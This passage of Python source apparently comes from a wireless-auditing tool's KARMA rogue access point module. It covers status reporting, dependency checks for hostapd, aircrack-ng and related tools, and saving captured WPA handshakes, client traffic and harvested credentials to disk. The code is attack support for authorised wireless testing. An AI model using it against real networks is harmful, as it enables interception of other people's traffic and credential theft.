                # Add password if cracked
                if client_mac in self.cracked_passwords:
                    client_info['password'] = self.cracked_passwords[client_mac]
                
                # Add credential count
                if client_mac in self.harvested_credentials:
                    client_info['credential_count'] = len(self.harvested_credentials[client_mac])
                
                status['client_details'].append(client_info)
            
            return status
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error getting KARMA status: {O}%s{W}' % str(e))
            return {
                'connected_clients': [],
                'connected_count': 0,
                'handshakes_captured': 0,
                'passwords_cracked': 0,
                'credentials_harvested': 0,
                'pnl_networks': 0,
                'client_details': []
            }

    def create_karma_directories(self):
        """Create KARMA capture directories with proper permissions"""
        directories = [
            Configuration.karma_captures_dir,
            Configuration.karma_probes_dir,
            Configuration.karma_handshakes_dir,
            Configuration.karma_credentials_dir,
            Configuration.karma_traffic_dir,
            Configuration.karma_live_monitoring_dir
        ]
        
        for directory in directories:
            try:
                os.makedirs(directory, exist_ok=True)
                
                # Set proper permissions (readable/writable by owner, readable by group/others)
                os.chmod(directory, 0o755)
                
                if Configuration.verbose > 1:
                    Color.pl('{+} {C}Created directory: {G}%s{W}' % directory)
            except Exception as e:
                Color.pl('{!} {R}Error creating directory %s: {O}%s{W}' % (directory, str(e)))

    def wait_for_file_accessibility(self, filepath, max_wait=10):
        """Wait for a file to become accessible (not locked by another process)"""
        wait_time = 0
        while wait_time < max_wait:
            try:
                # Check if file exists and is readable
                if os.path.exists(filepath) and os.access(filepath, os.R_OK):
                    # Try to open the file to ensure it's not locked
                    with open(filepath, 'rb') as f:
                        f.read(1)  # Try to read one byte
                    return True
                else:
                    time.sleep(0.5)
                    wait_time += 0.5
            except (IOError, OSError):
                time.sleep(0.5)
                wait_time += 0.5
        
        return False

    def save_probe_captures(self, capfile):
        """Save probe capture files to permanent directory"""
        try:
            # Create probes directory
            probes_dir = Configuration.karma_probes_dir
            if not os.path.exists(probes_dir):
                os.makedirs(probes_dir, exist_ok=True)
            
            # Generate filename with timestamp
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            filename = f'karma_probes_{timestamp}.cap'
            save_path = os.path.join(probes_dir, filename)
            
            # Copy file
            import shutil
            shutil.copy2(capfile, save_path)
            
            Color.pl('{+} {G}Probe captures saved to: {C}%s{W}' % save_path)
            return save_path
            
        except Exception as e:
            Color.pl('{!} {R}Error saving probe captures: {O}%s{W}' % str(e))
            return None

    def save_karma_handshake(self, handshake_file, client_mac, ap_bssid):
        """Save KARMA handshake to permanent directory"""
        try:
            # Create handshakes directory
            handshakes_dir = Configuration.karma_handshakes_dir
            if not os.path.exists(handshakes_dir):
                os.makedirs(handshakes_dir, exist_ok=True)
            
            # Generate filename
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            client_safe = client_mac.replace(':', '-')
            bssid_safe = ap_bssid.replace(':', '-')
            filename = f'karma_handshake_{client_safe}_{bssid_safe}_{timestamp}.cap'
            save_path = os.path.join(handshakes_dir, filename)
            
            # Wait for file to be fully written and accessible
            if not self.wait_for_file_accessibility(handshake_file, max_wait=10):
                Color.pl('{!} {R}Warning: Handshake file may still be locked, attempting copy anyway{W}')
            
            # Copy file with proper error handling
            import shutil
            try:
                shutil.copy2(handshake_file, save_path)
                
                # Verify the copied file is accessible
                if os.path.exists(save_path) and os.access(save_path, os.R_OK):
                    file_size = os.path.getsize(save_path)
                    Color.pl('{+} {G}✓ KARMA handshake saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
                    return save_path
                else:
                    Color.pl('{!} {R}Error: Copied handshake file is not accessible{W}')
                    return None
                    
            except Exception as copy_error:
                Color.pl('{!} {R}Error copying handshake file: {O}%s{W}' % str(copy_error))
                return None
            
        except Exception as e:
            Color.pl('{!} {R}Error saving KARMA handshake: {O}%s{W}' % str(e))
            return None

    def save_credential_data(self, capfile, client_mac, credentials):
        """Save credential harvest data to permanent directory"""
        try:
            # Create credentials directory
            creds_dir = Configuration.karma_credentials_dir
            if not os.path.exists(creds_dir):
                os.makedirs(creds_dir, exist_ok=True)
            
            # Generate filename
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            client_safe = client_mac.replace(':', '-')
            filename = f'karma_credentials_{client_safe}_{timestamp}.cap'
            save_path = os.path.join(creds_dir, filename)
            
            # Copy PCAP file
            import shutil
            shutil.copy2(capfile, save_path)
            
            # Save credentials to text file
            creds_file = save_path.replace('.cap', '_credentials.txt')
            with open(creds_file, 'w') as f:
                f.write(f"KARMA Credential Harvest - {timestamp}\n")
                f.write(f"Client MAC: {client_mac}\n")
                f.write(f"PCAP File: {filename}\n\n")
                f.write("Credentials Found:\n")
                for cred in credentials:
                    f.write(f"- {cred}\n")
            
            Color.pl('{+} {G}✓ Credential data saved to: {C}%s{W}' % save_path)
            Color.pl('{+} {G}✓ Credentials list saved to: {C}%s{W}' % creds_file)
            return save_path
            
        except Exception as e:
            Color.pl('{!} {R}Error saving credential data: {O}%s{W}' % str(e))
            return None

    def save_traffic_capture(self, capfile, client_mac):
        """Save client traffic capture to permanent directory"""
        try:
            # Create traffic directory
            traffic_dir = Configuration.karma_traffic_dir
            if not os.path.exists(traffic_dir):
                os.makedirs(traffic_dir, exist_ok=True)
            
            # Generate filename
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            client_safe = client_mac.replace(':', '-')
            filename = f'karma_traffic_{client_safe}_{timestamp}.cap'
            save_path = os.path.join(traffic_dir, filename)
            
            # Wait for file to be fully written and accessible
            if not self.wait_for_file_accessibility(capfile, max_wait=10):
                Color.pl('{!} {R}Warning: PCAP file may still be locked, attempting copy anyway{W}')
            
            # Copy file with proper error handling
            import shutil
            try:
                shutil.copy2(capfile, save_path)
                
                # Verify the copied file is accessible
                if os.path.exists(save_path) and os.access(save_path, os.R_OK):
                    file_size = os.path.getsize(save_path)
                    Color.pl('{+} {G}✓ Traffic capture saved to: {C}%s{W} ({G}%d bytes{W})' % (save_path, file_size))
                    return save_path
                else:
                    Color.pl('{!} {R}Error: Copied file is not accessible{W}')
                    return None
                    
            except Exception as copy_error:
                Color.pl('{!} {R}Error copying PCAP file: {O}%s{W}' % str(copy_error))
                return None
            
        except Exception as e:
            Color.pl('{!} {R}Error saving traffic capture: {O}%s{W}' % str(e))
            return None

    @staticmethod
    def can_attack_karma():
        """Check if Enhanced KARMA attack is possible (required tools available)"""
        required_tools = ['hostapd', 'dnsmasq', 'tshark', 'aireplay-ng', 'aircrack-ng']
        missing_tools = []
        
        for tool in required_tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            Color.pl('{!} {R}KARMA attack not available - missing required tools: {O}%s{W}' % ', '.join(missing_tools))
            Color.pl('{!} {O}Install missing tools with: sudo apt install %s{W}' % ' '.join(missing_tools))
            return False
        
        # Additional check: test if tools actually work
        try:
            # Test hostapd (help returns 1, which is normal)
            result = subprocess.run(['hostapd', '-h'], capture_output=True, timeout=5)
            if result.returncode not in [0, 1]:  # 0 = success, 1 = help shown
                Color.pl('{!} {R}hostapd found but not working properly{W}')
                Color.pl('{!} {O}This may be due to interface permission issues{W}')
                Color.pl('{!} {O}Try: sudo systemctl stop NetworkManager{W}')
                return False
            
            # Test dnsmasq (version returns 0 on success)
            result = subprocess.run(['dnsmasq', '--version'], capture_output=True, timeout=5)
            if result.returncode != 0:
                Color.pl('{!} {R}dnsmasq found but not working properly{W}')
                Color.pl('{!} {O}Try: sudo apt remove dnsmasq && sudo apt install dnsmasq{W}')
                return False
                
        except Exception as e:
            Color.pl('{!} {R}Error testing KARMA dependencies: {O}%s{W}' % str(e))
            return False
        
        return True
